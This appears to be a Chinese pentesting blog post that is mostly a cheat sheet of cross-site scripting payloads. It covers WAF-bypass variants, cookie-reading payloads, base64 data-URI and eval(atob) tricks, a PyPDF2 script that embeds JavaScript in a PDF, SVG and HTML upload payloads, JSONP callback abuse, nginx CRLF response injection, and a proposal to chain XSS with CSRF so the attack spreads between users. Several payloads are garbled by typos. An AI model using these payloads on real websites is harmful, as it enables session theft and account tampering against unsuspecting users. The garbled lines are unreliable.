---
title: 【渗透测试】XSS的各种打法
date: 2026-03-02
categories:
  - 渗透测试
image: /images/121.webp
---
# 1. 如何发现xss:
不要直接打弹框payload!!!!
先使用无害的js标签 测试是否会存在标签解析问题 
然后一点点绕过waf
几个无危害标签：
```php
<s>123
<h1>123</h1>
<p>123</p>
</tExtArEa><h1>123</h1>#
</tExtArEa><s>123#//--+eee
'"></tExtArEa><s>123#//--+eee

<tExtArEa></tExtArEa>这个是一个强制内部转义标签 
这个标签里面包裹的一切都被视为text文本
所以大部分输入框会用这个标签进行包裹。
```
# 2. 如何绕waf:
将原本的数据包发送到repeater  
然后一次次的尝试绕过 
直到你所输入的内容被解析为js
# 3. 各种小知识：
## 乱码问题：
改成楷体 14字号 基本解决所有问题。
## get参数：
get不能解析空格和一些特殊符号
要使用urlencode
或者把空格更改为+等
## 返回字体：
返回的彩色字体是js
返回的正常字体是文本
## 几个弹框函数：
```
alert(1)
prompt(1)
confirm(1)
```
## 单引号相关：
```
1.数字一般都可以不带单引号
2.可以使用`` 或者//进行代替
alert(/1/)
alert(`1`)
```
## 括号相关：
```
可以使用``进行代替
```
# 4. 几个收集的xss
```
</tExtArEa>'"<a/href="ja%26Tab;vas%26Tab;cript%26Tab;%26Tab;%26Tab;:%26Tab;%26Tab;top%26Tab; [8680439. . (30)] ()">click_me</a>#
```

```
`<div class=\"media-wrap image-wrap\"><img``src=\"https://img.threatbook.cn/c375eed802260503b4cee1086ea65f0e172480015227cf81a82d77.png\"```onerror=\"alert`1`\"/></div>``
```

```
<script$20type="text/javascript">%20var%20reg%20=%20/test/;%20var%20str%20=%20%27testString%27;%20var%20result%20=%20reg.exec(str);%20alert(result);%20</script>
```

```
<iframe src="data:text/html;base64,PFNDcmlwdD5hbGVydCgxKTwvU0NyaXB0Pg=="></iframe
```

解码之后是这个
```
<SCript>alert(1)</SCript>


```
```
<iframe src="data:text/html;base64,PG9iamVjdCBkYXRhPWRhdGE6dGV4dC9odG1sO2Jhc2U2NCxQSE5qY21sd2RENWhiR1Z5ZENnbmVITnpKeWs4TDNOamNtbHdkRDQ9Pjwvb2JqZWN0Pg==">
```
几个冷门的xss:
```
"\"><s>123456@.qqcom 邮箱xss  
<sTylE OnloAd=alert(1)>  
  
<dETAILS%0Aopen%0AonToGgle%0A=%0Aa=prompt,a()$20x>  
<dETAILS%0Aopen%0AonToGgle%0A=%0Aa=confirm,a()$20x>  
<dETAILS%OAopen&OAonToGgle*OA=&0Aa=confirm,a(document.cookie）%20x>  
<svg%20onmouseover&0A=0Aa=confirm,a(1)>  
<svg%0Aonmouseover&0A=&0Aa=confirm,a(1)%20x>  
<svg&20onmouseover&0A=&0Aa=confirm,a(document.cookie)>  
  
'+onclick=a=alert,a(1)%2F%2F  
'+onclick=a=alert,a(1)--+  
'+onclick=a=confirm,a(1)--+  
'+onclick=a=confirm,a(1)%2F%2F  
'%27+onclick='a=alert,a(1)'--+  
在对xss 标签进行注释的时候要使用--+和// ，经测试%23无效。如果onload不能用就换成其他属性。  
  
<marquee behavior="alternate" onstart=alert (1)>123</marquee><MaRQuEe BehAvIor="alternate" onStArt=alert(1)>123</MaRQuEe><body onpageshow=alert (1)>  
<body onPAgeShoW=confirm(111)>  
<details ontoggle=alert ()>  
向下按钮 xss  
<SVg </onLoaD ="1> (_=prompt,_(1)) "">  
<script>eval (atob('YWxlcnQoZG9jdw1lbnQuY29va211KTs='));</script>  
  
<d3"<"/onclick="1>[confirm`"]"<">dianwo  
需要点击  
<w="/x="y>"/oNCliCk=`<`[confir\u006d"`]>dianwo<w="/x="y>"/ondblclick=<^[confir\u006d``]>dianwo2双击  
需要点击  
需要  
<w="/x="y>"/oNDb1CliCk=`<`[confir\u006d`]>dianwo2双击  
需要  
<!*/*"/*/*/*/"/*--></Script><Image SrcSet=K */ ;OnError=confirm^1` //>  
<img/src/onerror=\u0061\u006c\u0065\u0072\u0074(1)><object data=javascript:alert(1)>  
<svg onload=setInterval`alert\x28document.domain\x29`>  
<img src=1 onerror=javascript: {{. ('alert(1)) ()}}><a href=javascript: {{. ('alert(1) ') ()))>dianwo</a>  
点击一次  
点击一次  
<a href=javascript:<x ng-app>{{. ('alert(1) ;) ()}}>dianwo</a>点击一次  
<a href=javascript:{{.('alert(1)')()}}>dianwo</a>点击一次  
<d3"<"/onclick="1>[confirm``]"<">dianwo 点击一次  
<d3"<"/oNDblCliCk="1>[confirm``]"<">dianwo 需要双击  
%00EEEE<svg/\/\//ONLoad='a\u006c\u0065\u0072\u0074(1)'/\/\/\>svg>  
<svg><set end=1 onend=[1] .find(alert)>  
<body onpageshow="alert(1)">  
<detail open ontoggle=alert(1)>  可能不会弹窗 但也会有xss   
<details open ontoggle=\u0061\u006c\u0065\u0072\u0074(1)>  
<details%20ontoggle=confirm()>//  
#弹窗！
```
上面的只要通杀 全是高危 甚至严重。
# 5. pdfxss:低-无危害
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260302125150.png)
```
from PyPDF2 import PdfWriter
writer = PdfWriter()
writer.add_js("app.alert(document.cookie);")
with open("xss_payload.pdf", "wb") as f:
   writer.write(f)
```
# 6. htmlxss:中-低危
上传一个html文件：
内容为：
```
<script>alert(1)</script>
```
# 7. svgxss:中-低危
创建一个svg文件 内容如下 然后传上去就完事了
```
<svg xmlns="http://www.w3.org/2000/svg”version="1.1">
<circle cx="100"cy="50"r="40"stroke="black”stroke-width="2"fill="red"/>
<script>alert(1)</script>
</svg>
```
# 8. 其他xss:
## 8.1. swagger -xss
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260302125441.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260302125453.png)
## 8.2. jsonp:
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260302125508.png)
这里直接更改jsoncallback=后面的值就可以了
有时候也叫callback
可以混一个漏洞~~ 主站基本就是高危 旁站低危
## 8.3. nginx：
回车换行漏洞：
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260302125541.png)
```
第一次回车换行为插入到cookie位置的栏 写一次%0a%0d
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260302125711.png)
```
第二次回车换行为插入到返回包渲染位置的栏 写两次%0a%0d
也就是说可以直接写入xsspayload
```
浏览器渲染了就是有漏洞
## 8.4. 编辑器处的链接xss:
```
"<script>alert(1)</script>
<script>alert(2)</script>
medium--> É‹•'Ê£ˆý£ˆ<sc<script>ript>alert(4)</script>
'6b;P">iIÝÉ‡'ý£ˆ<ScRiPt>alert(5)</script>
<img src=1 onerror=alert(7)>
onmouseover=¡⁻alert(9)¡⁻
<script>alert(11);</script>
>"'><img src="javascript.:alert(12)">
>"><script>alert(13)</script>
<table background='javascript.:alert(14)'></table>
<object type=text/html
data='javascript.:alert(15);'></object>
  "+alert(16)+"
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260302125915.png)
## 8.5. xss+csrf：
csrf：让用户在不知情的情况下，访问一些会对用户造成影响的路径
比如：支付 转账 登陆退出 更改账密 更改头像等
xss：网站没有对用户的输入进行过滤 导致可以实现用户输入的内容被当作javascript进行执行。
javascript可以实现对指定网站指定路径的访问。
所以只要使用xss实现csrf就会出现很多更高危害的漏洞
例如：
当用户查看你的头像 或者加载了你的昵称的时候 让他直接登录退出，或者改成你的头像，昵称等 进一步传播这个漏洞。
这里是一个大佬的记录：
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260302125942.png)

